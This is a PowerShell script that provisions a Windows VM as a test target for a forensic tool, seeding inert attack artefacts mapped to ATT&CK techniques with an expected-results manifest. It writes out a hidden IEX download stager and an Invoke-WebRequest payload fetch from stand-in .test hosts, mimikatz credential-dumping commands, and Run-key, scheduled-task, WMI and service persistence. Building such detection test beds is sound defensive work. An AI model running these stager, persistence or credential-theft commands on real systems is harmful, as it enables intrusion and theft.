<#
.SYNOPSIS
  Turns a fresh Windows VM into a Gandalf test target: lab user, PowerShell
  remoting, and a set of known, inert artefacts with a ground-truth manifest.

.DESCRIPTION
  Run elevated. Vagrant runs it automatically (Intel host); on Apple silicon run
  it yourself inside the UTM VM (see lab/README.md). Safe to re-run.

  The lab password comes from $env:LAB_PASSWORD (Vagrant passes it from the
  macOS Keychain) or is prompted for. It is never written to disk.

  Network indicators use documentation ranges (198.51.100.0/24, *.test).
#>
[CmdletBinding()]
param(
    [string]$LabUser = "gandalf",
    # A clean host for stacking: the lab user and remoting, nothing seeded
    [switch]$Clean
)
$ErrorActionPreference = "Stop"

function Write-Step($m) { Write-Host "`n== $m ==" -ForegroundColor Cyan }

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw "Run this from an elevated PowerShell (Run as administrator)."
}

$Password = $env:LAB_PASSWORD
if ([string]::IsNullOrEmpty($Password)) {
    $sec = Read-Host "Lab password for '$LabUser'" -AsSecureString
} else {
    $sec = ConvertTo-SecureString $Password -AsPlainText -Force
}

Write-Step "Lab user"
if (Get-LocalUser -Name $LabUser -ErrorAction SilentlyContinue) {
    Set-LocalUser -Name $LabUser -Password $sec
} else {
    New-LocalUser -Name $LabUser -Password $sec -FullName "Rivendell lab" -PasswordNeverExpires | Out-Null
}
Add-LocalGroupMember -Group "Administrators" -Member $LabUser -ErrorAction SilentlyContinue
Write-Host "  '$LabUser' is a local administrator (Invoke-Gandalf needs admin rights)."

Write-Step "PowerShell remoting"
Get-NetConnectionProfile | Where-Object NetworkCategory -eq "Public" | Set-NetConnectionProfile -NetworkCategory Private
Enable-PSRemoting -Force -SkipNetworkProfileCheck | Out-Null
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "localhost,127.0.0.1,lab-*" -Force
# Local accounts get a filtered token over remoting unless this is set.
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWord -Force | Out-Null
Write-Host "  WinRM enabled; TrustedHosts = localhost, lab-*"

if ($Clean) {
    Write-Host "`nProvisioned $env:COMPUTERNAME as a clean Gandalf target (nothing seeded)." -ForegroundColor Green
    return
}

Write-Step "Seeding artefacts"
$lab = "C:\ProgramData\RivendellLab"
New-Item -ItemType Directory -Force -Path $lab, "C:\Users\Public\Documents" | Out-Null

# T1059.001: inert "stager" whose text matches Suspicious_PowerShell_Command and Suspicious_Network_Activity.
@'
# rivendell-lab inert script: nothing here runs a download
$note = "powershell -nop -w hidden -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://c2.rivendell-lab.test/a')"
Write-Output "lab sync ok"
'@ | Set-Content -Path "$lab\sync.ps1" -Encoding UTF8

# T1070.006: timestomped script. Setting the times changes $STANDARD_INFORMATION only,
# so its creation time lands years before the $FILE_NAME one.
"Write-Output rivendell-lab" | Set-Content -Path "$lab\helper.ps1"
$stomp = Get-Date "2019-03-14 09:26:53"
(Get-Item "$lab\helper.ps1").CreationTime = $stomp
(Get-Item "$lab\helper.ps1").LastWriteTime = $stomp

# T1564.004: a script hidden in an alternate data stream of a text file.
"Rivendell lab readme" | Set-Content -Path "C:\Users\Public\Documents\readme.txt"
"Write-Output rivendell-lab" | Set-Content -Path "C:\Users\Public\Documents\readme.txt" -Stream "update.ps1"

# T1546.003: WMI event subscription persistence; the consumer only runs "cmd /c exit 0".
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*LabUpdaterFilter*" } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name = 'LabUpdaterFilter'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name = 'LabUpdaterConsumer'" | Remove-WmiObject
$wmiFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "LabUpdaterFilter"; EventNamespace = "root\cimv2"; QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$wmiConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "LabUpdaterConsumer"; CommandLineTemplate = "cmd.exe /c exit 0"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $wmiFilter; Consumer = $wmiConsumer } | Out-Null

# T1547.001: Run key persistence (the command only echoes).
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output rivendell-lab"))
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "LabUpdater" `
    -Value "powershell.exe -w hidden -enc $enc" -PropertyType String -Force | Out-Null

# T1053.005: scheduled task persistence.
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -File `"$lab\sync.ps1`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "LabSync" -Action $action -Trigger $trigger -Description "Rivendell lab" -Force | Out-Null

# T1003.001 strings (text only) for Potential_Credential_Access.
"privilege::debug`r`nsekurlsa::logonpasswords`r`nmimikatz notes for the lab - password reuse on 198.51.100.23" |
    Set-Content -Path "C:\Users\Public\Documents\notes.txt"

# T1543.003: a service that does nothing.
if (-not (Get-Service -Name LabHelper -ErrorAction SilentlyContinue)) {
    sc.exe create LabHelper binPath= "C:\Windows\System32\cmd.exe /c exit 0" start= demand DisplayName= "Lab Helper" | Out-Null
}

# T1110.001: failed logons (4625) from bad credentials against the local machine.
# Windows PowerShell 5.1 turns a native command's stderr into a terminating error
# under "Stop", even redirected, and these are meant to fail.
& {
    $ErrorActionPreference = "Continue"
    1..10 | ForEach-Object { net use \\127.0.0.1\IPC$ /user:labattacker "wrong$_" 2>$null | Out-Null }
    net use \\127.0.0.1\IPC$ /delete /y 2>$null | Out-Null
}

# PSReadLine history for the lab user (ConsoleHost_history.txt).
$hist = "C:\Users\$LabUser\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
New-Item -ItemType Directory -Force -Path $hist | Out-Null
@"
whoami /all
Get-LocalGroupMember Administrators
Invoke-WebRequest http://update.rivendell-lab.test/payload.ps1 -OutFile C:\ProgramData\RivendellLab\p.ps1
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
"@ | Set-Content -Path "$hist\ConsoleHost_history.txt"

@'
{
  "seeded": [
    {"artefact": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\LabUpdater", "attack": "T1547.001", "yara": ["Persistence_Registry_Keys"]},
    {"artefact": "Scheduled task LabSync", "attack": "T1053.005"},
    {"artefact": "C:\\ProgramData\\RivendellLab\\sync.ps1", "attack": "T1059.001", "yara": ["Suspicious_PowerShell_Command", "Suspicious_Network_Activity"]},
    {"artefact": "C:\\ProgramData\\RivendellLab\\helper.ps1", "attack": "T1070.006", "expect": ["Timestomp"]},
    {"artefact": "C:\\Users\\Public\\Documents\\notes.txt", "attack": "T1003.001", "yara": ["Potential_Credential_Access"]},
    {"artefact": "Service LabHelper", "attack": "T1543.003"},
    {"artefact": "C:\\Users\\Public\\Documents\\readme.txt:update.ps1", "attack": "T1564.004", "expect": ["AlternateDataStream"]},
    {"artefact": "WMI subscription LabUpdaterFilter -> LabUpdaterConsumer", "attack": "T1546.003", "expect": ["LabUpdaterConsumer"]},
    {"artefact": "Security 4625 x10 (labattacker)", "attack": "T1110.001"},
    {"artefact": "PSReadLine ConsoleHost_history.txt (gandalf)", "attack": "T1059.001", "expect": ["Invoke-WebRequest http"]}
  ],
  "iocs": ["198.51.100.23", "c2.rivendell-lab.test", "update.rivendell-lab.test"]
}
'@ | Set-Content -Path "$lab\expected.json" -Encoding UTF8

Write-Host "`nProvisioned $env:COMPUTERNAME as a Gandalf target." -ForegroundColor Green
